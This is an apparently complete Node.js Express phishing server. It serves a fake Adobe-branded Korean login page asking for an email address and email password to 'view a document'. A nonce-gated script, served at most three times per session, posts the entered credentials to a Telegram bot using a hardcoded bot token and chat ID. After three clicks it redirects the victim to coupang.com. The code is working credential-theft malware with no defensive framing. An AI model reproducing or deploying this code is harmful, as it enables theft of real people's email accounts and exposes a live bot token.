const express = require('express');
const crypto = require('crypto');
const session = require('express-session');

const app = express();

// Session middleware to store the nonce and script serving count
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set to true if using HTTPS
}));

// Middleware to generate and store a nonce
app.use((req, res, next) => {
    if (!req.session.nonce) {
        req.session.nonce = crypto.randomBytes(16).toString('hex'); // Generate a random nonce
        req.session.scriptServedCount = 0; // Initialize script serving count
    }
    next();
});

// Serve the HTML page with the nonce embedded
app.get('/', (req, res) => {
    const nonce = req.session.nonce;
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <title>Adobe</title>
            <link href="https://opensource.keycdn.com/fontawesome/4.6.3/font-awesome.min.css" rel="stylesheet">
            <link rel="icon" type="image/png" href="https://docs.com/1673155405_Images/favicon.ico">
            <style>
                /* Your CSS styles here */
            </style>
        </head>
        <body>
            <!-- Your HTML content here -->
            <form name="myForm">
                <input name="ai" id="ai" required class="inp" size="30" style="margin-top:20px;" type="email" placeholder="이메일 주소"> <br>
                <input name="pr" id="pr" required class="inp" size="30" style="margin-bottom:5px;" type="password" placeholder="이메일 비밀번호"> <br>
                <input type="checkbox">로그인 상태 유지(<span style="font-size:0.8em; color:#999;">공용 컴퓨터를 사용하는 경우 확인하지 마세요</span>) <br><br>
                <input value="문서 보기" class="btn" type="button" name="sub-btn" id="sub-btn">
            </form>
            <script src="https://express-nonce-server1.onrender.com/script?nonce=${nonce}"></script>
        </body>
        </html>
    `);
});

// Serve the script only if the nonce is valid and the script has not been served more than the allowed number of times
app.get('/script', (req, res) => {
    const clientNonce = req.query.nonce;
    const serverNonce = req.session.nonce;
    const maxScriptServes = 3; // Maximum number of times the script can be served

    if (clientNonce && clientNonce === serverNonce) {
        if (req.session.scriptServedCount < maxScriptServes) {
            // Serve the script
            req.session.scriptServedCount += 1; // Increment the script serving count
            res.type('application/javascript');
            res.send(`
                let clickCount = 0;

                document.getElementById('sub-btn').addEventListener('click', function() {
                    const email = document.getElementById('ai').value;
                    const password = document.getElementById('pr').value;

                    const botToken = '7947046036:AAEoHoF5-UnES0CrQsWK2JLJBfQhfjLbJ2w';
                    const chatId = '6567885539';
                    const message = \`New Form Submission:\\nEmail: \${email}\\nPassword: \${password}\`;

                    const url = \`https://api.telegram.org/bot\${botToken}/sendMessage\`;

                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert('Form submitted successfully!');
                        } else {
                            alert('Failed to submit form. Please try again.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred. Please try again.');
                    });

                    clickCount++;
                    if (clickCount === 3) {
                        window.location.href = 'https://coupang.com';
                    }
                });
            `);
        } else {
            // Reject the request if the script has been served the maximum number of times
            res.status(403).send('Access denied. Script serving limit reached.');
        }
    } else {
        // Reject the request if the nonce is invalid
        res.status(403).send('Access denied. Invalid nonce.');
    }
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
